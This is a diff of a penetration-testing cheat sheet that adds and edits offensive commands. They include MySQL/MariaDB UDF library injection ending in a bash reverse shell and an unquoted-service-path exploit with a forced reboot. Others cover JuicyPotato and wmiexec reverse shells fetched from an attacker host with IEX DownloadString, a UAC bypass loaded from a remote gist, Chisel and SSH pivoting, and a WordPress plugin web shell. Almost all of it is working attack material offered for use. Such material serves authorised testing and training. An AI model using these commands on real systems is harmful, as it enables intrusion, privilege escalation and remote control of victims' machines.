@@ -1336,8 +1336,17 @@ $ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/sh
 
 ## MySQL/MariaDB
 
+Basic CLI syntax:
+
 ```
-$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
+$ mysql -h 127.0.0.1 -P 3306 -u snovvcrash -p'Passw0rd!' -e 'show databases;'
+```
+
+Basic enumeration:
+
+```
+mysql> show GRANTS;
+mysql> select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
 ```
 
 
@@ -1355,7 +1364,7 @@ $ sudo apt install libmariadbclient-dev -y
 $ git clone https://github.com/mysqludf/lib_mysqludf_sys && cd lib_mysqludf_sys
 ```
 
-Compile `.so` library for x86_64:
+Compile `.so` library (x86_64 MariaDB example):
 
 ```
 $ gcc lib_mysqludf_sys_x64.c -o lib_mysqludf_sys_x64.so -m64 -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
@@ -1370,7 +1379,11 @@ mysql> use mysql;
 mysql> create table pwn(line blob);
 mysql> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x86.so'));
 mysql> select * from pwn into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';
-(Or load it from hex: mysql> select unhex('7F..00') into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';)
+
+Or load it from hex:
+mysql> set @pwn = '7F..00';
+mysql> select unhex(@pwn) into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';
+
 mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_x86.so';
 mysql> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
 ```
@@ -1383,7 +1396,11 @@ MariaDB> use mysql;
 MariaDB> create table pwn(line blob);
 MariaDB> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x64.so'));
 MariaDB> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';
-(Or load it from hex: MariaDB> select unhex('7F..00') into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';)
+
+Or load it from hex:
+MariaDB> set @pwn = 0x7F..00;
+MariaDB> select binary @pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';
+
 MariaDB> create function sys_exec returns integer soname 'lib_mysqludf_sys_x64.so';
 MariaDB> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
 ```
@@ -2175,11 +2192,17 @@ $ sed -i subnets/ranges.txt -e 's/$/\/24/'
 Bash:
 
 ```
-$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a hosts/pingsweep.txt &); done
+$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a sweep.txt &); done
 Or
-$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a hosts/pingsweep.txt &); done
+$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a sweep.txt &); done
 
-$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
+$ sort -u -t'.' -k4,4n sweep.txt > hosts/targets.txt && rm sweep.txt
+```
+
+Batch:
+
+```
+Cmd > set "NET=10.5.5" && for /L %i in (1,1,255) do @ping -n 1 -w 200 %NET%.%i > nul && echo %NET%.%i > sweep.txt
 ```
 
 PowerShell (option 1):
@@ -2285,7 +2308,7 @@ $ nmaptocsv.py --help
 Echo:
 
 ```
-$ IP="0.0.0.0"; for p in $(seq 1 49152); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
+$ IP="0.0.0.0"; for p in $(seq 1 49152); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$p && echo OPEN:$p" >> hosts/ports.txt &) 2>/dev/null; done
 $ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
 ```
 
@@ -2871,7 +2894,6 @@ $ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/workspace/l
 $ git clone https://github.com/SecureAuthCorp/impacket ~/tools/impacket && cd ~/tools/impacket
 $ pipenv install -r requirements.txt && pipenv shell
 (impacket) $ pip install .
-(impacket) $ python examples/psexec.py
 ```
 
 
@@ -3157,6 +3179,7 @@ PS > Invoke-Seatbelt -Command "-group=all"
 ```
 PS > systeminfo
 PS > whoami /priv (whoami /all)
+PS > gci . -recurse -file -ea SilentlyContinue | select fullname
 PS > gci "$env:userprofile" -recurse -file -ea SilentlyContinue | select fullname
 PS > net user
 PS > net user /domain
@@ -3169,6 +3192,7 @@ PS > net group "Domain admins" /domain
 PS > net group "Enterprise admins" /domain
 PS > cmdkey /list
 PS > wmic product get name
+PS > wmic service get name,displayname,pathname,startmode
 PS > get-process
 PS > tasklist /SVC
 PS > net start
@@ -4259,9 +4283,13 @@ C:\Program Files\Sub Directory\Program Name.exe
 C:\Program.exe C:\Program Files\Sub.exe C:\Program Files\Sub Directory\Program.exeC:\Program Files\Sub Directory\Program Name.exe
 ```
 
-It gives an attacker the ability to inject malious binary into path to be executed with vulnerable service permissions:
+It gives an attacker the ability to inject malious binary into path to be executed with vulnerable service permissions.
+
+Enumerate services:
 
 ```
+PS > Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /vi "c:\windows"
+Cmd > wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /iv c:\windows
 Cmd > sc qc VulnerableSvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -4275,11 +4303,16 @@ SERVICE_NAME: VulnerableSvc
         DISPLAY_NAME       : Vulnerable Service
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
+```
 
+Exploit `VulnerableSvc`:
+
+```
 Cmd > move pwn.exe "C:\Program Files\Vulnerable\Vulnerable.exe"
 Cmd > sc stop VulnerableSvc
 Cmd > sc start VulnerableSvc
-...Or restart the PC if the attacker has SeShutdownPrivilege...
+...Or reboot the PC if the attacker has SeShutdownPrivilege...
+Cmd > shutdown /r /t 0
 ```
 
 Malious binary example:
@@ -5129,11 +5162,39 @@ Notes:
 * `1` With SSH (or Chisel, for example) **server** running on the Attacker the same can be achieved by doing **local** port forwarding instead of **remote**.
 
 ```
-snovvcrash@attacker:~$ ./chisel server -p 8000
-root@pivot1:~# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:9001 &
-root@pivot1:~# netstat -tulpan | grep 443
+snovvcrash@attacker:$ ./chisel server -p 8000
+root@pivot1:# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:9001 &
+root@pivot1:# netstat -tulpan | grep 443
 tcp6       0      0 :::443                 :::*                    LISTEN      18406/./chisel
-snovvcrash@attacker:~$ rlwrap nc -lvnp 9001
+snovvcrash@attacker:$ rlwrap nc -lvnp 9001
+```
+
+
+
+### Remote Dynamic Forwarding
+
+* Attacker's IP: `10.10.13.37`
+* Victims's IP: `10.10.13.38`
+
+An example how to safely set remote dynamic port forwarding (SOCKS) with a builin SSH client.
+
+Generate a dummy SSH key on Victim:
+
+```
+alice@victim:$ ssh-keygen -f dummy_key -t ed25519 -q -N ""
+```
+
+Add `dummy_key.pub` contents to `authorized_keys` on Attacker with the following options:
+
+```
+snovvcrash@victim:$ vi ~/.ssh/authorized_keys
+from="10.10.13.38",command="echo 'Only port forwarding is allowed'",no-agent-forwarding,no-X11-forwarding,no-pty <DUMMY_KEY_PUB>
+```
+
+Connect to Attacker's SSH server from Victim:
+
+```
+alice@victim:$ ssh -fN -R 1080 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i dummy_key snovvcrash@10.10.13.37
 ```
 
 
@@ -5146,7 +5207,7 @@ snovvcrash@attacker:~$ rlwrap nc -lvnp 9001
 3. [https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
 
 * Attacker's IP: `10.10.13.37`
-* Victims's IP: `192.168.0.20`
+* Victims's IP: `10.10.13.38`
 
 Reverse local port `1111` (on Victim) to local port `2222` (on Attacker):
 
@@ -5168,16 +5229,16 @@ PS > Start-Process -NoNewWindow chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2
 Socks5 proxy with Chisel in server mode:
 
 ```
-bob@victim:$ ./chisel server -p 8000 --socks5 &
-root@kali:$ ./chisel client 192.168.0.20:8000 socks
+alice@victim:$ ./chisel server -p 8000 --socks5 &
+root@kali:$ ./chisel client 10.10.13.38:8000 socks
 ```
 
 Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel supports socks5 in client mode now):
 
 ```
 root@kali:$ ./chisel server -p 8000 --reverse
-bob@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
-bob@victim:$ ./chisel server -v -p 8002 --socks5 &
+alice@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
+alice@victim:$ ./chisel server -v -p 8002 --socks5 &
 root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 ```
 
@@ -5185,7 +5246,7 @@ Socks5 proxy with Chisel in client mode:
 
 ```
 root@kali:$ ./chisel server -p 8000 --reverse --socks5
-bob@victim:$ ./chisel client 10.10.13.37:8000 R:socks
+alice@victim:$ ./chisel client 10.10.13.37:8000 R:socks
 ```
 
 
@@ -5197,7 +5258,7 @@ bob@victim:$ ./chisel client 10.10.13.37:8000 R:socks
 
 ```
 root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
-bob@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
+alice@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
 ```
 
 
@@ -5292,11 +5353,12 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 
 ```
 $ curl -L https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe > j.exe
-$ curl -L https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1 > rev.ps1
+$ curl -L https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLine.ps1 > rev.ps1
+...Change LHOST to 10.10.13.37 and LPORT to 443...
 Cmd > certutil -urlcache -split -f http://10.10.13.37/j.exe C:\Windows\System32\spool\drivers\color\j.exe
 Cmd > echo cmd /c powershell -exec bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')" > rev.bat
 $ sudo rlwrap nc -lvnp 443
-Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+Cmd > .\j.exe -l 1337 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
 ```
 
 
@@ -5308,7 +5370,7 @@ Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c 
 * [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1)
 
 ```
-PS > . .\Invoke-BadPotato.ps1; Invoke-BadPotato -Command "C:\Users\snovvcrash\music\pwn.exe"
+PS > . .\Invoke-BadPotato.ps1; Invoke-BadPotato -C "C:\Users\snovvcrash\music\pwn.exe"
 ```
 
 
@@ -5679,6 +5741,8 @@ $ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -
 $ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
 ```
 
+Note: always use full username when authenticating as a domain user, because if there're 2 users sharing the same name (a local user and a domain user), say `WORKGROUP\Administrator` and `MEGACORP\Administrator`, and you're trying to authenticate as a domain admin without providing the domain prefix, authentication will fail.
+
 
 
 
@@ -5692,7 +5756,7 @@ $ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 1
 ### psexec.py
 
 ```
-$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [powershell.exe]
 $ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -5725,7 +5789,7 @@ PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name C
 ### wmiexec.py
 
 ```
-$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@127.0.0.1
 $ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -5734,7 +5798,7 @@ Get a PowerShell reverse-shell:
 ```
 $ sudo python3 -m http.server 80
 $ sudo rlwrap nc -lvnp 443
-$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
+$ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
 ```
 
 
@@ -6131,6 +6195,8 @@ done < "${FILES}"
 
 # UAC Bypass
 
+* [https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
+
 
 
 
@@ -6193,15 +6259,8 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 ```
 PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/362be57caaa167e7f5667156ac80f445/raw/1990959bc80b56179863aede06695bc499249744/Bypass-UAC.ps1')
-PS > Bypass-UAC
+PS > Bypass-UAC -C "C:\Users\snovvcrash\music\met.exe"
 ```
-
-
-
-
-## Bypass-UAC
-
-* [https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
 
 
 
@@ -7311,6 +7370,20 @@ function handleResponse() {
     changeReq.send('csrf='+token+'&email=test@example.com')
 };
 </script>
+```
+
+
+
+
+## WordPress
+
+Reverse-shell with a malicious plugin:
+
+```
+$ cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
+$ zip plugin-shell.zip plugin-shell.php
+...Upload plugin-shell.zip (do not activate it)...
+$ curl 'http://10.10.13.37/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami'
 ```
 
 
